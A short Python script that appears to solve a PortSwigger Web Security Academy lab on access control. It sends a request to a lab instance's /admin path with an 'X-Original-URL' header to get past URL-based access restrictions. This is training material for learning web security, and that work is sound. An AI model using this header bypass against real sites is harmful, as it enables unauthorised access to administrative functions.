import requests

# SCRIPT FOR PORTSWIGGER LAB ON ACCESS CONTROL "URL-based access control can be circumvented"

response = requests.get(
        f"https://0a2d0016037fd61b81f462a900ab00ef.web-security-academy.net/admin",
        headers={
            'X-Original-URL': '/admin',
        },
    )

print("Response code: ", response.status_code)
print("Response: ", response.content)